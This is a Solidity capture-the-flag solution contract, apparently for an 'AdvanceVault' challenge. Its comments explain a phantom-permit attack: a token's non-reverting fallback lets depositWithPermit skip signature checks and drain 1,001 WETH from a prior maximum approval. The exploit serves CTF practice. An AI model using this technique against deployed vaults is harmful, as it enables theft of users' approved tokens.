// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../../contracts/AdvanceVault/Vault.sol";
import "../../contracts/AdvanceVault/Setup.sol";

contract Solve {
    Setup public setup; // Setup contract address

    Vault public vault;

    address public weth; // Wrapped

    constructor(address _setup) {
        setup = Setup(_setup);
        vault = Vault(setup.vault());
        weth = address(setup.weth());
    }

    function solve() public {
        // Call depositWithPermit in Vault
        vault.depositWithPermit(address(weth), address(setup), 1_001 * 10 ** 18, 0, 0, 0, 0);

        // Explain:
        // 1. Vault will call permit function in WannaETH token
        // 2. Permit function is not implemented in WannaETH token
        // 3. So fallback function will be called
        // 4. Fallback function will call deposit and nothing happen (do not revert)
        // 5. Vault is bypassed permit call and deposit 1_001 * 10 ** 18 WETH from the Setup contract ((allowed maximum earlier)

        // Ref Vi: https://th13vn.medium.com/b%C3%B3ng-ma-b%C3%AAn-trong-smart-contract-e11fbe009873
        // Ref En: https://blog.verichains.io/p/phantom-in-your-smart-contract

        // Check if solved
        require(setup.isSolved(), "Not solved");
    }
}
